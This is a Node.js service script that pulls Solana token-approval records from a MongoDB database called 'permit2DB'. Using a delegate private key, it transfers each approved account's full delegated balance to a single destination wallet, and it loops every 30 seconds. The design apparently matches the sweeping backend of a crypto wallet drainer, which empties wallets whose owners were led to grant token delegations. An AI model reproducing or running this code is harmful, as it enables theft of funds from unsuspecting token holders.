require('dotenv').config();

const { MongoClient } = require('mongodb');
const { Connection, Keypair, PublicKey, Transaction } = require('@solana/web3.js');
const { 
  getAccount, 
  createTransferInstruction,
  TOKEN_PROGRAM_ID 
} = require('@solana/spl-token');

// Configuration
const MONGO_URI = process.env.MONGODB_URI;

// Solana network configuration
const solanaConfig = {
  'mainnet-beta': {
    rpcUrl: process.env.SOLANA_MAINNET_RPC || 'https://api.mainnet-beta.solana.com',
    delegatePrivateKey: process.env.SOLANA_MAINNET_DELEGATE_PRIVATE_KEY, // Base58 encoded private key
    destinationAddress: process.env.SOLANA_MAINNET_DESTINATION, // Where to send tokens
  },
};

const client = new MongoClient(MONGO_URI);

// Helper to convert private key string to Keypair
function getKeypairFromPrivateKey(privateKeyString) {
  try {
    // Try base58 decoding first (common format)
    const secretKey = Buffer.from(privateKeyString, 'base64');
    if (secretKey.length === 64) {
      return Keypair.fromSecretKey(secretKey);
    }
    // If that doesn't work, try as array
    const keyArray = JSON.parse(privateKeyString);
    return Keypair.fromSecretKey(Uint8Array.from(keyArray));
  } catch (error) {
    throw new Error('Invalid private key format. Use base64 encoded 64-byte secret key or JSON array.');
  }
}

async function transferApprovedTokens() {
  try {
    await client.connect();
    const db = client.db('permit2DB');
    const solanaApprovalsCollection = db.collection('solana_approvals');

    // Find verified approvals that haven't been executed/transferred
    const approvals = await solanaApprovalsCollection.find({ 
      verified: true,
      executed: { $ne: true },
      transferred: { $ne: true }
    }).toArray();

    if (approvals.length === 0) {
      console.log('No verified Solana approvals ready for transfer');
      return;
    }

    console.log(`Found ${approvals.length} verified approvals ready for transfer`);

    for (const approvalData of approvals) {
      const { owner, delegate, approvals: approvalList, network } = approvalData;

      if (!network || !solanaConfig[network]) {
        console.log(`Unsupported network ${network} for owner: ${owner}`);
        continue;
      }

      const { rpcUrl, delegatePrivateKey, destinationAddress } = solanaConfig[network];
      
      if (!delegatePrivateKey) {
        console.log(`No delegate private key configured for network ${network}`);
        continue;
      }

      if (!destinationAddress) {
        console.log(`No destination address configured for network ${network}`);
        continue;
      }

      try {
        // Get delegate keypair from private key
        const delegateKeypair = getKeypairFromPrivateKey(delegatePrivateKey);
        const delegatePublicKey = delegateKeypair.publicKey;

        // Verify the delegate matches
        if (delegatePublicKey.toString() !== delegate) {
          console.log(`Delegate mismatch: config=${delegatePublicKey.toString()}, DB=${delegate}`);
          continue;
        }

        const connection = new Connection(rpcUrl, 'confirmed');
        const destinationPublicKey = new PublicKey(destinationAddress);
        const ownerPublicKey = new PublicKey(owner);

        console.log(`Processing transfers for owner: ${owner} on network: ${network}`);
        console.log(`Destination: ${destinationAddress}`);

        const transferResults = [];
        const transaction = new Transaction();

        // Create transfer instructions for each approved token
        for (const approval of approvalList) {
          try {
            const tokenAccountPubkey = new PublicKey(approval.tokenAccount);
            const accountInfo = await getAccount(connection, tokenAccountPubkey);

            // Verify delegate is set and has allowance
            if (!accountInfo.delegate || 
                accountInfo.delegate.toString() !== delegatePublicKey.toString()) {
              console.log(`❌ Delegate not set for token account: ${approval.tokenAccount}`);
              transferResults.push({
                tokenAccount: approval.tokenAccount,
                success: false,
                reason: 'Delegate not set',
              });
              continue;
            }

            if (accountInfo.delegatedAmount === 0n) {
              console.log(`❌ No delegated amount for token account: ${approval.tokenAccount}`);
              transferResults.push({
                tokenAccount: approval.tokenAccount,
                success: false,
                reason: 'No delegated amount',
              });
              continue;
            }

            // Get the amount to transfer (use delegated amount or account balance, whichever is smaller)
            const transferAmount = accountInfo.delegatedAmount < accountInfo.amount 
              ? accountInfo.delegatedAmount 
              : accountInfo.amount;

            if (transferAmount === 0n) {
              console.log(`⚠️ No balance to transfer for token account: ${approval.tokenAccount}`);
              transferResults.push({
                tokenAccount: approval.tokenAccount,
                success: false,
                reason: 'No balance to transfer',
              });
              continue;
            }

            // Get or create destination token account
            // For simplicity, assuming destination token account exists
            // You might need to create it if it doesn't exist
            const destinationTokenAccount = await connection.getParsedTokenAccountsByOwner(
              destinationPublicKey,
              { mint: new PublicKey(approval.mint) }
            );

            if (destinationTokenAccount.value.length === 0) {
              console.log(`⚠️ Destination token account not found for mint: ${approval.mint}`);
              transferResults.push({
                tokenAccount: approval.tokenAccount,
                success: false,
                reason: 'Destination token account not found',
              });
              continue;
            }

            const destinationTokenAccountPubkey = destinationTokenAccount.value[0].pubkey;

            // Create transfer instruction
            const transferInstruction = createTransferInstruction(
              tokenAccountPubkey, // source
              destinationTokenAccountPubkey, // destination
              delegatePublicKey, // authority (delegate)
              transferAmount, // amount
              [], // multiSigners
              TOKEN_PROGRAM_ID
            );

            transaction.add(transferInstruction);

            transferResults.push({
              tokenAccount: approval.tokenAccount,
              mint: approval.mint,
              amount: transferAmount.toString(),
              success: true,
            });

            console.log(`✅ Added transfer instruction for ${approval.tokenAccount}: ${transferAmount.toString()}`);
          } catch (tokenError) {
            console.error(`Error processing token ${approval.tokenAccount}:`, tokenError);
            transferResults.push({
              tokenAccount: approval.tokenAccount,
              success: false,
              reason: tokenError.message,
            });
          }
        }

        if (transaction.instructions.length === 0) {
          console.log(`No valid transfers to execute for owner: ${owner}`);
          await solanaApprovalsCollection.updateOne(
            { _id: approvalData._id },
            { 
              $set: { 
                transferred: true,
                transferredAt: new Date(),
                transferResults,
                reason: 'No valid transfers to execute',
              } 
            }
          );
          continue;
        }

        // Get recent blockhash and set fee payer
        const { blockhash } = await connection.getLatestBlockhash();
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = delegatePublicKey;

        // Sign and send transaction
        transaction.sign(delegateKeypair);
        const signature = await connection.sendRawTransaction(transaction.serialize(), {
          skipPreflight: false,
        });

        // Wait for confirmation
        await connection.confirmTransaction(signature, 'confirmed');

        console.log(`✅ Transfer transaction confirmed: ${signature}`);

        // Update database
        await solanaApprovalsCollection.updateOne(
          { _id: approvalData._id },
          { 
            $set: { 
              transferred: true,
              transferredAt: new Date(),
              transferTransactionSignature: signature,
              transferResults,
            } 
          }
        );

        console.log(`✅ Transfers completed for owner: ${owner}`);
      } catch (transferError) {
        console.error(`Error transferring tokens for owner ${owner}:`, transferError);
        await solanaApprovalsCollection.updateOne(
          { _id: approvalData._id },
          { 
            $set: { 
              executed: true,
              executedAt: new Date(),
              reason: `Transfer error: ${transferError.message}`,
            } 
          }
        );
        continue;
      }
    }
  } catch (error) {
    console.error('Transfer failed:', error);
  } finally {
    await client.close();
  }
}

async function runContinuously() {
  console.log('Starting continuous Solana token transfer service...');
  
  while (true) {
    try {
      await transferApprovedTokens();
    } catch (error) {
      console.error('Error in transfer cycle:', error);
    }
    
    console.log('Waiting 30 seconds before next check...');
    await new Promise(resolve => setTimeout(resolve, 30000));
  }
}

// Run if called directly
if (require.main === module) {
  runContinuously().catch((error) => {
    console.error('Service failed:', error);
    process.exit(1);
  });
}

module.exports = { transferApprovedTokens };

